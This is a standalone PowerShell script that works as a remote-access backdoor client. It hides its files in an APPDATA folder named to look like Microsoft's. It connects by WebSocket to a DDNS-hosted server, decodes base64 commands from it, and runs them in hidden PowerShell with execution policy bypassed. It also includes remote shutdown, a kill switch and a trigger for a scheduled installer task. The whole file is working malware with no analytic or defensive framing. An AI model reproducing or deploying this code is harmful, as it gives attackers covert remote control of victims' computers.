$m1 = New-Object System.Threading.Mutex($false, "run.exe")
if (-not $m1.WaitOne(0)) {
  exit
}

$m2 = New-Object System.Threading.Mutex($false, "run.ps1")
if (-not $m2.WaitOne(0)) {
  exit
}

$VPS_WS_URL = "ws://runx.ddns.net/ws/client"
$VPS_POLL_URL = "http://runx.ddns.net/api/poll"
$IdPath = "$env:APPDATA\Microsoft\run\run.txt"

if (Test-Path $IdPath) {
  $raw = (Get-Content $IdPath -Raw).Trim()
  if ($raw.Length -ge 8) {
    $uniqueId = $raw.Substring(0, 8)
  }
  else {
    $uniqueId = $raw
  }
}
else {
  $uniqueId = ([guid]::NewGuid().ToString()).Substring(0, 8)
  Set-Content -Path $IdPath -Value $uniqueId
}

$uniqueUser = "$($env:USERNAME)-$uniqueId-W"
$SCRIPT_VERSION = "2af43f8"
$clientVersion = $SCRIPT_VERSION

$logDir = "$env:APPDATA\Microsoft\run"
if (-not (Test-Path $logDir)) {
  New-Item -ItemType Directory -Path $logDir -Force | Out-Null
}
$logFile = "$logDir\run.log"

function Log-Msg($msg) {
  $line = "$(Get-Date -Format 'yyyy-MM-dd HH:mm:ss') $msg"
  Add-Content -Path $logFile -Value $line -ErrorAction SilentlyContinue
}

Log-Msg "[INFO] run.ps1 started. Acquired mutexes."
Log-Msg "[INFO] Client: $uniqueUser, Version: $clientVersion"

function Execute-CommandPayload ($r) {
  if ($r.run -eq $true -and -not [string]::IsNullOrEmpty($r.cmd)) {
    $c = [System.Text.Encoding]::UTF8.GetString(
      [System.Convert]::FromBase64String($r.cmd)
    )
    Log-Msg "[INFO] Received command payload. Command: $c"

    if ($c -match "panic") {
      Log-Msg "[INFO] Command matched 'panic'. Exiting."
      exit
    }
    elseif ($c -match "altf4") {
      Log-Msg "[INFO] Command matched 'altf4'. Shutting down system."
      Start-Process `
        -FilePath "shutdown" `
        -ArgumentList "/s", "/t", "0" `
        -WindowStyle Hidden
    }
    elseif ($c -match "sauce") {
      Log-Msg "[INFO] Command matched 'sauce'. Starting WinRunInstaller scheduled task."
      Start-ScheduledTask `
        -TaskName "WinRunInstaller"
    }
    else {
      $style = if ($r.visible -eq $true) {
        "Normal"
      }
      else {
        "Hidden"
      }

      Log-Msg "[INFO] Executing PowerShell command (WindowStyle: $style)..."
      Start-Process powershell.exe `
        -ArgumentList @(
        "-NoProfile",
        "-ExecutionPolicy",
        "Bypass",
        "-Command",
        $c
      ) -WindowStyle $style
    }
  }
}

try {
  while ($true) {
    try {
      $safeUser = [System.Uri]::EscapeDataString([string]$uniqueUser)
      $safeVer = [System.Uri]::EscapeDataString([string]$clientVersion)
      $wsUriStr = $VPS_WS_URL + "?username=" + $safeUser + "&version=" + $safeVer + "&client_type=cmd"
      Log-Msg "[INFO] Connecting WebSocket to $wsUriStr..."

      $uri = New-Object System.Uri($wsUriStr)
      $ws = New-Object System.Net.WebSockets.ClientWebSocket
      $ws.Options.KeepAliveInterval = [TimeSpan]::FromSeconds(15)

      $cts = New-Object System.Threading.CancellationTokenSource
      $cts.CancelAfter(10000)

      $ws.ConnectAsync($uri, $cts.Token).Wait()

      if ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
        Log-Msg "[INFO] WebSocket connection established successfully."
        $buffer = [System.ArraySegment[byte]]::new((New-Object byte[] 8192))

        while ($ws.State -eq [System.Net.WebSockets.WebSocketState]::Open) {
          $ms = New-Object System.IO.MemoryStream
          $closeReceived = $false

          do {
            $receiveTask = $ws.ReceiveAsync($buffer, [System.Threading.CancellationToken]::None)
            $receiveTask.Wait()
            $result = $receiveTask.Result

            if ($result.MessageType -eq [System.Net.WebSockets.WebSocketMessageType]::Close) {
              $closeReceived = $true
              break
            }

            if ($result.Count -gt 0) {
              $ms.Write($buffer.Array, $buffer.Offset, $result.Count)
            }
          } while (-not $result.EndOfMessage -and $ws.State -eq [System.Net.WebSockets.WebSocketState]::Open)

          if ($closeReceived) {
            Log-Msg "[INFO] WebSocket received close frame from server."
            try {
              $ws.CloseAsync([System.Net.WebSockets.WebSocketCloseStatus]::NormalClosure, "", [System.Threading.CancellationToken]::None).Wait()
            }
            catch {}
            break
          }

          if ($ms.Length -gt 0) {
            $jsonStr = [System.Text.Encoding]::UTF8.GetString($ms.ToArray())
            Log-Msg "[INFO] Received WebSocket data: $jsonStr"
            $r = $jsonStr | ConvertFrom-Json
            Execute-CommandPayload $r
          }
        }
      }
    }
    catch {
      Log-Msg "[ERROR] WebSocket Connection Error: $($_.Exception.ToString())"
    }

    Log-Msg "[INFO] Reconnecting in 3 seconds..."
    Start-Sleep -Seconds 3
  }
}
finally {
  if ($m1) {
    $m1.ReleaseMutex()
    $m1.Dispose()
  }

  if ($m2) {
    $m2.ReleaseMutex()
    $m2.Dispose()
  }
}
